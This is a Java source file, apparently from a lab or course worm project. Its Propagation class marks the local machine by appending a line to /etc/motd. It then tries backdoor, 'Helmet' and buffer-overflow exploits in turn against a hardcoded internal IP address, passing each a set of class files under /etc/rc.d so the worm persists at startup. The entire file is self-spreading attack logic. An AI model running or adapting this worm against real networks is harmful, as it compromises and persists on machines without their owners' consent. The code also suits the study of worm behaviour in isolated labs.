

public class Propagation {
	
	final static boolean backdoor = true;
	final static boolean helmet = true;
	final static boolean bufferoverflow = true;
	final static String[] file = {"/etc/rc.d/Propagation.class", "/etc/rc.d/BackdoorExploit.class",
								  "/etc/rc.d/BufferOverflow.class", "/etc/rc.d/BufferOverflowExploit.class", "/etc/rc.d/Exploit.class", "/etc/rc.d/HelmetExploit.class",
								  "/etc/rc.d/Telnet.class", "/etc/rc.d/Telnet$1.class", "/etc/rc.d/.classpath"};/*{"/root/sample2", "/root/sampleCopy"};*/
	
	public static void main(String[] args){
		
		String[] list = new String[]{"10.166.42.164"};
		
		
		String[] IP = new String[list.length];
		for(int i = 0; i < list.length; i++){
			IP[i] = list[i];
		}
		
		
		//deliver an innocuous payload to current machine
		String time = Long.toString(System.currentTimeMillis());
		try{
			String[] command = {"/bin/bash", "-c", "/bin/echo worm executed: " + time + " >> /etc/motd"};
			Process proc = Runtime.getRuntime().exec(command);
			proc.waitFor();
		}catch(Exception e){
			System.err.println("delivering payload faild!");
		}
		
		
		boolean success;
		
		for(int i = 0; i < IP.length; i++){
			success = false;
			System.out.println(IP[i] + ": ");
			
			//Backdoor
			if(!success && backdoor){
				//System.out.print("\tbackdoor: ");
				BackdoorExploit bde = new BackdoorExploit(IP[i], "brit", file);
				success = bde.exploit();
			}
			
			//Helmet
			if(!success && helmet){
				HelmetExploit helm = new HelmetExploit("helmet1", file, IP[i]);
				success = helm.exploit();
			}
			
			//BufferOverflow
			if(!success && bufferoverflow){
				System.out.println("bufferoverflow: ");
				BufferOverflowExploit buffover = new BufferOverflowExploit("buffover", file, IP[i]);
				success = buffover.exploit();
			}
			
			if(!success){
				System.err.println("failed to exploit: " + IP[i]);
			}
		}
		
		System.out.println("end exploit");
		
		System.exit(0);
	}
}
